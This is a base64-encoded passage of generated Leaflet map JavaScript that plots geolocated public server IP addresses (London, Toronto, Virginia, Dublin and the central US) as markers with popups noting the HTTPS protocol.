B1cF8zMGUzNDI5NjAzNjU0NzFhODQ4ZGQzODc5ODA5ZWQ3OS5zZXRDb250ZW50KGh0bWxfN2U4Yjc5OWI1NDM4NDUwYjg4MDMwMDQ1NTE3MDgxOWQpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl80NWVjMTgzMTZjNzY0YTZkYjNjY2QwOTBkMWFhOTI2Mi5iaW5kUG9wdXAocG9wdXBfMzBlMzQyOTYwMzY1NDcxYTg0OGRkMzg3OTgwOWVkNzkpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzQ1ZWMxODMxNmM3NjRhNmRiM2NjZDA5MGQxYWE5MjYyLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9lOWUyN2RkYjJhMTM0NjMyOGZlZGZkNmIwODM4MjM4OCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzcuNzUxLCAtOTcuODIyXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMDQ1NDFiMmQ3OTdiNDdkZTk0NzVkODliMDk5ZTlhOTkgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZTllMjdkZGIyYTEzNDYzMjhmZWRmZDZiMDgzODIzODguc2V0SWNvbihpY29uXzA0NTQxYjJkNzk3YjQ3ZGU5NDc1ZDg5YjA5OWU5YTk5KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzNiZGRjY2JlN2RjMTRmMDA5NDBmYTk2YWE5Zjk5NDY1ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMjExNmMwMGY5YTQyNGNkNDllNWY2Mjk1NGJmNjNkNTYgPSAkKGA8ZGl2IGlkPSJodG1sXzIxMTZjMDBmOWE0MjRjZDQ5ZTVmNjI5NTRiZjYzZDU2IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgTG9uZ2l0dWRlPS05Ny44MjIsIExhdGl0dWRlPTM3Ljc1MTxicj4yMC4zOC45OC4xNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzNiZGRjY2JlN2RjMTRmMDA5NDBmYTk2YWE5Zjk5NDY1LnNldENvbnRlbnQoaHRtbF8yMTE2YzAwZjlhNDI0Y2Q0OWU1ZjYyOTU0YmY2M2Q1Nik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2U5ZTI3ZGRiMmExMzQ2MzI4ZmVkZmQ2YjA4MzgyMzg4LmJpbmRQb3B1cChwb3B1cF8zYmRkY2NiZTdkYzE0ZjAwOTQwZmE5NmFhOWY5OTQ2NSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZTllMjdkZGIyYTEzNDYzMjhmZWRmZDZiMDgzODIzODguYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTm9uZSwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9kMjM0YjljMzFhNjU0Mjg2YWYyYjFiODE1MDIwMTI1ZiA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9kZTNmOWY5NGIzZGU0YWEyOTIxZTU1MmE2OTljMDA4NyA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9kMjM0YjljMzFhNjU0Mjg2YWYyYjFiODE1MDIwMTI1Zi5zZXRJY29uKGljb25fZGUzZjlmOTRiM2RlNGFhMjkyMWU1NTJhNjk5YzAwODcpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYTRhYzFmODgzZWE0NDg1MDlmMzEwNGJhZGU1NWZiMGMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8zM2UzZjcwM2IwNmU0MzJjYjIxMzFjNjEyZTVhYTc4MCA9ICQoYDxkaXYgaWQ9Imh0bWxfMzNlM2Y3MDNiMDZlNDMyY2IyMTMxYzYxMmU1YWE3ODAiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjg4LjI1NS4xMTU8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2E0YWMxZjg4M2VhNDQ4NTA5ZjMxMDRiYWRlNTVmYjBjLnNldENvbnRlbnQoaHRtbF8zM2UzZjcwM2IwNmU0MzJjYjIxMzFjNjEyZTVhYTc4MCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2QyMzRiOWMzMWE2NTQyODZhZjJiMWI4MTUwMjAxMjVmLmJpbmRQb3B1cChwb3B1cF9hNGFjMWY4ODNlYTQ0ODUwOWYzMTA0YmFkZTU1ZmIwYykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZDIzNGI5YzMxYTY1NDI4NmFmMmIxYjgxNTAyMDEyNWYuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzAwM2M0NTZhMDE0ZjRjYzdhMWYzYzEwNDE3YjYxOTc1ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszNy43NTEsIC05Ny44MjJdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl80YTZkYjQxZTkyM2Y0MzYwYjcxN2I3MDVlZWIxNjI4NCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8wMDNjNDU2YTAxNGY0Y2M3YTFmM2MxMDQxN2I2MTk3NS5zZXRJY29uKGljb25fNGE2ZGI0MWU5MjNmNDM2MGI3MTdiNzA1ZWViMTYyODQpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfM2JkYjcxMWNiYTYxNGZlOWE5MTMwZTAyODk1YTc5YTMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9mYzlmYWMzYmNhM2Y0ZjkxYWM5MDczMjc1ODRjMjMzNCA9ICQoYDxkaXYgaWQ9Imh0bWxfZmM5ZmFjM2JjYTNmNGY5MWFjOTA3MzI3NTg0YzIzMzQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBMb25naXR1ZGU9LTk3LjgyMiwgTGF0aXR1ZGU9MzcuNzUxPGJyPjIwLjM4Ljk4LjE2NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfM2JkYjcxMWNiYTYxNGZlOWE5MTMwZTAyODk1YTc5YTMuc2V0Q29udGVudChodG1sX2ZjOWZhYzNiY2EzZjRmOTFhYzkwNzMyNzU4NGMyMzM0KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMDAzYzQ1NmEwMTRmNGNjN2ExZjNjMTA0MTdiNjE5NzUuYmluZFBvcHVwKHBvcHVwXzNiZGI3MTFjYmE2MTRmZTlhOTEzMGUwMjg5NWE3OWEzKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8wMDNjNDU2YTAxNGY0Y2M3YTFmM2MxMDQxN2I2MTk3NS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBOb25lLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzM5NmFiZDNjZWRhMjQwYTFiOTVhMWI2NzNlYWY3ZGY4ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzk5ZGZkM2U0NDM0NTQzNTRiZjY3Y2Q0MDUzYWQxZTg5ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzM5NmFiZDNjZWRhMjQwYTFiOTVhMWI2NzNlYWY3ZGY4LnNldEljb24oaWNvbl85OWRmZDNlNDQzNDU0MzU0YmY2N2NkNDA1M2FkMWU4OSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8wNGI3OWM0YWU2NTU0NjVhYWQ0YTk4NTI4YmM2ZjBhMiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2U4NDA4NTQ2NWZlYTQwNzY4N2U4OGY0ZGE2OWI0MWQxID0gJChgPGRpdiBpZD0iaHRtbF9lODQwODU0NjVmZWE0MDc2ODdlODhmNGRhNjliNDFkMSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4yMzkuMjIwLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8wNGI3OWM0YWU2NTU0NjVhYWQ0YTk4NTI4YmM2ZjBhMi5zZXRDb250ZW50KGh0bWxfZTg0MDg1NDY1ZmVhNDA3Njg3ZTg4ZjRkYTY5YjQxZDEpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8zOTZhYmQzY2VkYTI0MGExYjk1YTFiNjczZWFmN2RmOC5iaW5kUG9wdXAocG9wdXBfMDRiNzljNGFlNjU1NDY1YWFkNGE5ODUyOGJjNmYwYTIpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzM5NmFiZDNjZWRhMjQwYTFiOTVhMWI2NzNlYWY3ZGY4LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfODkwYWFlYjY2MDI5NDY5Yjg1NjJhN2E1Y2RlOWI5ZWEgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fN2NjZDA4ZTQyZjg5NGRiNmJmNzU3MWQ0YzA4M2I3MGQgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfODkwYWFlYjY2MDI5NDY5Yjg1NjJhN2E1Y2RlOWI5ZWEuc2V0SWNvbihpY29uXzdjY2QwOGU0MmY4OTRkYjZiZjc1NzFkNGMwODNiNzBkKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzNhYmNhMDM1NTAxNDRjZjc4MzliZDZjZThjYzRlODk0ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNTQ2YmQ5YzljNTlkNDkxM2I3NmExMTExNTgwNTAwMDEgPSAkKGA8ZGl2IGlkPSJodG1sXzU0NmJkOWM5YzU5ZDQ5MTNiNzZhMTExMTU4MDUwMDAxIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj40MC44NS4yMzIuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzNhYmNhMDM1NTAxNDRjZjc4MzliZDZjZThjYzRlODk0LnNldENvbnRlbnQoaHRtbF81NDZiZDljOWM1OWQ0OTEzYjc2YTExMTE1ODA1MDAwMSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzg5MGFhZWI2NjAyOTQ2OWI4NTYyYTdhNWNkZTliOWVhLmJpbmRQb3B1cChwb3B1cF8zYWJjYTAzNTUwMTQ0Y2Y3ODM5YmQ2Y2U4Y2M0ZTg5NCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfODkwYWFlYjY2MDI5NDY5Yjg1NjJhN2E1Y2RlOWI5ZWEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2NkMzI3OTM3NzhmYTRhZDE4YTQ2MGI0OGFiNTg4NjVhID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2FmNjkyYzc3MDczYTQ2YzdhODgxOTI1N2U3NWNlMWVkID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2NkMzI3OTM3NzhmYTRhZDE4YTQ2MGI0OGFiNTg4NjVhLnNldEljb24oaWNvbl9hZjY5MmM3NzA3M2E0NmM3YTg4MTkyNTdlNzVjZTFlZCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF84ZjE3ZDc3Y2Y5ZWM0MDI0OGUyZTczNTNmMzdiZTk5YyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzMzNGNiMzc2M2Y5NTRlOTc5MjU0NmZjMzc0MmIxN2FjID0gJChgPGRpdiBpZD0iaHRtbF8zMzRjYjM3NjNmOTU0ZTk3OTI1NDZmYzM3NDJiMTdhYyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj4xNjguNjIuMzIuMjA8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzhmMTdkNzdjZjllYzQwMjQ4ZTJlNzM1M2YzN2JlOTljLnNldENvbnRlbnQoaHRtbF8zMzRjYjM3NjNmOTU0ZTk3OTI1NDZmYzM3NDJiMTdhYyk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2NkMzI3OTM3NzhmYTRhZDE4YTQ2MGI0OGFiNTg4NjVhLmJpbmRQb3B1cChwb3B1cF84ZjE3ZDc3Y2Y5ZWM0MDI0OGUyZTczNTNmMzdiZTk5YykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfY2QzMjc5Mzc3OGZhNGFkMThhNDYwYjQ4YWI1ODg2NWEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9hYmJhNmEzNmFhZmY0MGFjYTliMTE3MjdlNzYyZmQ1ZCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl81M2Y2ZWRkOTEzOTk0MDVmODFjOTRiNTc3NDljZjk2OCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9hYmJhNmEzNmFhZmY0MGFjYTliMTE3MjdlNzYyZmQ1ZC5zZXRJY29uKGljb25fNTNmNmVkZDkxMzk5NDA1ZjgxYzk0YjU3NzQ5Y2Y5NjgpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNTBjZDJiYTExOTFhNDI1MmE3NDk5MGM0MWZjYWVlN2IgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9mZjhiOTkzYTNlZWI0OWMxOWVmMThjZWJlNzliYWE0ZSA9ICQoYDxkaXYgaWQ9Imh0bWxfZmY4Yjk5M2EzZWViNDljMTllZjE4Y2ViZTc5YmFhNGUiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC4zMjxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNTBjZDJiYTExOTFhNDI1MmE3NDk5MGM0MWZjYWVlN2Iuc2V0Q29udGVudChodG1sX2ZmOGI5OTNhM2VlYjQ5YzE5ZWYxOGNlYmU3OWJhYTRlKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfYWJiYTZhMzZhYWZmNDBhY2E5YjExNzI3ZTc2MmZkNWQuYmluZFBvcHVwKHBvcHVwXzUwY2QyYmExMTkxYTQyNTJhNzQ5OTBjNDFmY2FlZTdiKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9hYmJhNmEzNmFhZmY0MGFjYTliMTE3MjdlNzYyZmQ1ZC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2U2OTg4OTc3Nzc0MzRmNTRiNjQwNjY1YzM2NjMzYmZiID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1My4zMzMxLCAtNi4yNDg5XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZDY1NTkyYzQwZDQxNDc0ZGFmZjFjYzZmNzgzYTVkZmYgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZTY5ODg5Nzc3NzQzNGY1NGI2NDA2NjVjMzY2MzNiZmIuc2V0SWNvbihpY29uX2Q2NTU5MmM0MGQ0MTQ3NGRhZmYxY2M2Zjc4M2E1ZGZmKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzY3MTEyNjc0MjkzMjQzNzI4NTFkMTVmMTBiOWZlZjRkID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYTU5ZDEwZDZmNmNiNDNiYjk5NWIyZDg3M2VjMmJiN2EgPSAkKGA8ZGl2IGlkPSJodG1sX2E1OWQxMGQ2ZjZjYjQzYmI5OTV